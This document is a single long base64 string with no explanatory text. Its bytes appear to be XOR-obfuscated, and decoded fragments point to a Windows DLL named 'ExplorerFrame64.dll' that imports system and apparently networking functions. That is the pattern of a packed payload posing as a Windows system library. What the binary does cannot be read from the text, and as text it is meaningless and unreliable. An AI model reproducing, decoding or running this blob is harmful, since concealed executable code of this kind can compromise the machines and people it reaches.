MYx4XDHMfFwwjEBcMJQNHHhgRFxhzHhcYIx8XGCUcZ9fEFxcWFxcXJdEWFy7RFhf82BYXLtEWFxYVFhcVJxcXHh0TFx0jERcdJRFn18QXFxYXFxea0BYX19AWFzfHFhfX0BYXFhMWFxMFFxcWExYXEzUXFxYXFxcXFxcXFxcXF3feFxcXFxcXn6UVFxcXFxcXFxcXFxcXFxcXFxcVFxcXt6UVF9+lFRcXFxcXFxcXFxcXFxcHFxcXB8gVFxcXFxfo6OjoFxcXFw8XFxd/3xcXFxcXFxcXFxcXFxcXFxcXFy/IFRcXFxcX6Ojo6BcXFxcPFxcXP94XFxcXFxcXFxcXFxcXFxcXFxd33hcXFxcXFwekFRcXFxcXFxcXFxcXFxcXFxcXFBcXFyekFRe3pRUX36UVFxcXFxcXFxcXFxcXFxcXFxcXFxcXd8gVFxcXFxfo6OjoFxcXFw8XFxff3xcXFxcXFxcXFxcXFxcXFxcXF3feFxcXFxcXb6QVFxcXFxcXFxcXFxcXFxcXFxcVFxcXh6QVF9+lFRcXFxcXFxcXFxcXFxcXFxcXp8gVFxcXFxfo6OjoFxcXFw8XFxeX9xcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX6Ojo6BcXFxcNoxUXFhcXFxIXFxcSFxcX/6QVF+ukFRcHoxUXW74XF1+jFRdhoxUXs6MVF8+jFRchoxUXf6MVF4WjFRfToxUXOaMVFxYXFRcUFxMXFxdSb2d7eGVyZVFldnpyISM5c3t7F155ZGN2e3sXU3t7UHJjVHt2ZGRYdX1ydGMXUm9ne3hlcmVRZXZ6cjlTe3tQcmNUe3ZkZFh1fXJ0YxdTe3tQcmNBcmVkfnh5F1JvZ3t4ZXJlUWV2enI5U3t7UHJjQXJlZH54eRdTe3tFcnB+ZGNyZURyZWFyZRdSb2d7eGVyZVFldnpyOVN7e0VycH5kY3JlRHJlYXJlF1N7e0J5ZXJwfmRjcmVEcmVhcmUXUm9ne3hlcmVRZXZ6cjlTe3tCeWVycH5kY3JlRHJlYXJlFxcXb6EVFxcXFxcXFxcXQakVF6f3FhfvrhUXFxcXFxcXFxfdqRUXJ/MWFz+hFRcXFxcXFxcXF1+oFRd39xYX36IVFxcXFxcXFxcXN9cVFxf3FhfHrRUXFxcXFxcXFxdH1xUXH/IWF8+uFRcXFxcXFxcXF4HXFRcH8xYXL60VFxcXFxcXFxcXp9cVF2fzFhd/oRUXFxcXFxcXFxfD1xUXt/cWF6etFRcXFxcXFxcXFzvWFRf/8xYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXa6gVFxcXFxd/qBUXFxcXFwXXFRcXFxcX6agVFxcXFxf7qBUXFxcXF82oFRcXFxcX36gVFxcXFxevqBUXFxcXF7eoFRcXFxcXm6gVFxcXFxdFqBUXFxcXFxcXFxcXFxcXwakVFxcXFxfxqRUXFxcXFymoFRcXFxcXM6gVFxcXFxcDqBUXFxcXF+mpFRcXFxcX5akVFxcXFxcXFxcXFxcXF6vXFRcXFxcXFxcXFxcXFxdLqxUXFxcXF3+rFRcXFxcXYasVFxcXFxeRqxUXFxcXF4OrFRcXFxcXtasVFxcXFxehqxUXFxcXF9GrFRcXFxcXzasVFxcXFxf9qxUXFxcXF+2rFRcXFxcXGaoVFxcXFxc3qhUXFxcXFyeqFRcXFxcXK6oVFxcXFxdDqhUXFxcXF3mqFRcXFxcXm6oVFxcXFxeLqhUXFxcXF6+qFRcXFxcX26oVFxcXFxfxqhUXFxcXF+GqFRcXFxcXEakVFxcXFxcPqRUXFxcXFz2pFRcXFxcXUakVFxcXFxdz0hUXFxcXF1mrFRcXFxcXKdIVFxcXFxc50hUXFxcXFw3SFRcXFxcXG9IVFxcXFxcX0hUXFxcXF+fTFRcXFxcXydMVFxcXFxcpqxUXFxcXFzmrFRcXFxcXDasVFxcXFxcdqxUXFxcXF++sFRcXFxcX+6wVFxcXFxfBrBUXFxcXF9OsFRcXFxcXuawVFxcXFxeLrBUXFxcXF5msFRcXFxcXkawVFxcXFxdnrBUXFxcXF02sFRcXFxcXXawVFxcXFxc5rBUXFxcXFzesFRcXFxcXG6wVFxcXFxcXrBUXFxcXF+OtFRcXFxcX29MVFxcXFxel0xUXFxcXF4/TFRcXFxcXkdMVFxcXFxdj0xUXFxcXF3/TFRcXFxcXS9MVFxcXFxdd0xUXFxcXF2XSFRcXFxcXIdMVFxcXFxcx0xUXFxcXF0fSFRcXFxcX/60VFxcXFxcP0xUXFxcXFy3WFRcXFxcXWdYVFxcXFxd/1hUXFxcXF2vWFRcXFxcXj9YVFxcXFxeh1hUXFxcXF8XWFRcXFxcX8dYVFxcXFxfv1hUXFxcXFxvVFRcXFxcXMdUVFxcXFxcr1RUXFxcXF0XVFRcXFxcXe9UVFxcXFxeV1RUXFxcXF4fVFRcXFxcXv9UVFxcXFxer1RUXFxcXF9nVFRcXFxcXydUVFxcXFxf51RUXFxcXFxHUFRcXFxcXCdQVFxcXFxch1BUXFxcXF0nUFRcXFxcXfdQVFxcXFxdv1BUXFxcXF5HUFRcXFxcXh9QVFxcXFxeJ1BUXFxcXF6fUFRcXFxcX1dQVFxcXFxfH1BUXFxcXF/HUFRcXFxcX5dQVFxcXFxfp1BUXFxcXFx/TFRcXFxcXFxcXFxcXFxdn1xUXFxcXF03XFRcXFxcXk9cVFxcXFxcXFxcXFxcXF7WpFRcXFxcXg6kVFxcXFxdjqRUXFxcXF3OpFRcXFxcXuakVFxcXFxeVqRUXFxcXF9WpFRcXFxcXFxcXFxcXFxcAFxcXFxcXly4XFxcXFxeXBxcXFxcXF5ceFxcXFxcXlxMXFxcXFxeXBBcXFxcXF5ccFxcXFxcXl2QXFxcXFxeXIxcXFxcXF5cUFxcXFxcXl7PXFRcXFxcXYxcXFxcXF5cbFxcXFxcXlwIXFxcXFxeXFxcXFxcXFxf11xUXFxcXF+3XFRcXFxcXGdYVFxcXFxcXFxcXFxcXF1fXFRcXFxcXOdcVFxcXFxcXFxcXFxcXF2cTRXJ2c1F+e3IXF1ARe2RjZXtyeUAXFw4RQGV+Y3JRfntyF4USQ3Jlen55dmNyR2V4dHJkZBcXyxdUZXJ2Y3JHfmdyFxdyFlJvZ3Z5c1J5YX5leHl6cnljRGNlfnlwZFYXCRNHcnJ8WXZ6cnNHfmdyF8kSQHZ+Y1F4ZUR+eXB7clh1fXJ0Yxf8FFpie2N+VW5jckN4QH5zclR/dmUXlBJEe3JyZxeRF1R7eGRyX3Z5c3tyF8UVUHJjRGN2ZWNiZ155cXhWFxIRQH5zclR/dmVDeFpie2N+VW5jchfIF1RlcnZjckdleHRyZGRWFxdiFVByY1p4c2J7clF+e3JZdnpyVhcX9RRaeGFyUX57clYXPxJEcmNRfntyR3h+eWNyZRcXwRdUZXJ2Y3JaYmNyb1YXF2AVUHJjWnhzYntyX3Z5c3tyVhcX7xVQcmNDcnpnR3Zjf1YXF3QVUHJjW3ZkY1JlZXhlFxfVF1RlcnZjclF+e3JWFwsSRHJjUmFyeWMXFwYWU3J7cmNyUX57clYX5xdUZXJ2Y3JDf2VydnMXF9QTRXJkcmNSYXJ5YxcXWRVQcmNRfntyRH5tchfhFVByY0NyemdRfntyWXZ6clYXF6wXVGVydmNyUmFyeWNWFxd9FVByY1t4cH50dntTZX5hcmQXFyYVUHJjU2V+YXJDbmdyVhcMEkRyY1JlZXhlWnhzchcXPBVQcmNTfmR8UWVyckRndnRyVhdqFlF+eXNRfmVkY1F+e3JWFxeZFlF+eXNZcm9jUX57clYXbhZRfnlzVHt4ZHIXeRZRfntyQ356ckN4RG5kY3J6Q356chcXehZRfntyQ356ckN4W3h0dntRfntyQ356chc3EUBlfmNyR2V+YXZjckdleHF+e3JEY2VidGNWFxdzFVByY1t4dHZ7Q356chcXuBVQcmNHZX5hdmNyR2V4cX57ckRjZWJ0Y1YXFwwVUHJjVGJlZXJ5Y0dleHRyZGQXyBVQcmNEbmRjcnpTcnF2YntjW3Z5cF5TFxcIFFByY0FyZWR+eHlSb1YX8RVQcmNEbmRjcnpeeXF4F5gUXmRAeGAhI0dleHRyZGQXFzATR2V4dHJkZCQlUX5lZGMXF+4XVGVydmNyQ3h4e39ye2ckJUR5dmdkf3hjFxc+E0dleHRyZGQkJVlyb2MXXFJFWVJbJCU5c3t7Fxc0FERyY1RiZWR4ZUd4ZBcXzBR6eGJkckhyYXJ5YxduFVp2Z0F+ZWNidntccm5WFxfNFHxybnVzSHJhcnljF+AVRXJ7cnZkclNUF6kWUHJjRG5kY3J6WnJjZX50ZBcXVhZQcmNTVBdCRFJFJCU5c3t7Fxd6FlNye3Jjclh1fXJ0YxcXfRZTcntyY3JTVBcXdBVQcmNTXlV+Y2QXJhdUZXJ2Y3JUeHpndmN+dXtyU1QXF10URHJ7cnRjWHV9cnRjFxcnF1RlcnZjclR4emd2Y351e3JVfmN6dmcXFwQXVX5jVXtjFxdQU14kJTlze3sXZxZQcmNDeHxyeV55cXhlenZjfnh5FwIVWGdyeUdleHRyZGRDeHxyeRcXbRZQcmNCZHJlWXZ6clYXF+YXU2Jne350dmNyQ3h8cnlSbxcXnRdUZXJ2Y3JHZXh0cmRkVmRCZHJlVhcXnBVFcnBYZ3J5XHJuUm9WF78VRXJwRHJjQXZ7YnJSb1YXF34VRXJwU3J7cmNyXHJuUm9WF3QVRXJwVGVydmNyXHJuUm9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XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcVNxcXFhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFTcXFxUXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFycnFZcWFxcXFhcXFxcXFxcWFxcXFxcXFxcXFxcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFz/EFZcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXP8QVlxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc/xBWXFhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFz/EFZcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXP8QVlxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXl88VlxYXFxcXFxcXFxcXFxcXFxcXFxcXpyUVlxYXFxcnIxWXFhcXFxc0FZcWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX18YVlxYXFxcnxBWXFhcXF1QXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcXFxcXFxc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3NxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tFxcXFxcXVlVUU1JRUF9eXVxbWllYR0ZFRENCQUBPTk0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBxcXFxcXFzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXdnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm0XFxcXFxdWVVRTUlFQX15dXFtaWVhHRkVEQ0JBQE9OTRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcWFRMfFxcXFxcXFxcXFxcXsxQXF3eVbpU2FxcXFxcXF7HIFxcXFxcXtrIXFxcXFxeWiPfrFxcXF1dpl+sXFxcXvxQXF9a0zbQ3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxeW6RcXFxcXF1fpFxcXFxcXohQXF9a0zbQ3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxeW6RcXFxcXF1bpFxcXFxcXoRQXF9i187UNF/K1/7VMFxcXFxcXFxcXFxcXFxcXFxeW6RcXFxcXF1dptukXFxcXRhIXF0bNSc03F0jNfc0lFxcXFxcXFxcXFxcXFxcXFxeWxM/J9+4XFyZplukXFxcX6ejo6BcXFxcXFxcXFxcXFw/OFZcWFxcXS+YVlxYXFxdL5hWXFhcXF0vmFZcWFxcXS+YVlxYXFxdL5hWXFhcXF0vmFZcWFxcXS+YVlxYXFxdL5hWXFhcXF0vmFZcWFxcXaGhoaGhoaGgLzhWXFhcXF3fmFZcWFxcXd+YVlxYXFxd35hWXFhcXF3fmFZcWFxcXd+YVlxYXFxd35hWXFhcXF3fmFZcWFxcXORcXFzkXFxfp6Ojo6Ojo6BcXFxcXFxcXFhcXFxcXFxcXFxcXFxcXF2KPFxcXFxcXFxcXFxcXFxcWFxcXFxcXFxcXFxcXFxcXlxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF+rq6up5cm9+dhcXFxcXFxcXFxcXJCI5Ji8gOSUkIjkmLy4XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF6wWVwgmICU5JiE5JSIiOSQXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhgWHxkRHBQTHhAVGhsXEh0UGhMQGBUfGRsXFh0RHhwSFxkQHB0TGhYSHxsRHhQVGBofHRYUGBMVHBEQGxcSGR4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